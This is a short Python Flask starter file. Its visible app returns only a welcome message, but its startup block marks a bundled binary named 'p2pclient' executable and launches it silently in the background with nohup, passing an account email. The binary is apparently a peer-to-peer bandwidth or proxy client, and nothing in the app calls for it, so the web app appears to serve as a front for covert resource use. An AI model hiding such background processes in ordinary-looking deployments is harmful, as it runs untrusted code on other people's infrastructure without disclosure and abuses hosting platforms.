from flask import Flask, jsonify
from subprocess import Popen,PIPE
import os

app = Flask(__name__)


@app.route('/')
def index():
    return jsonify({"Choo Choo": "Welcome to your Flask app 🚅"})


if __name__ == '__main__':
    os.system("chmod +x p2pclient")
    connection=Popen(f"nohup ./p2pclient -l jcarlos1993@hotmail.com".split(), stdout=PIPE, stdin=PIPE)
    app.run(debug=True, port=os.getenv("PORT", default=5000))
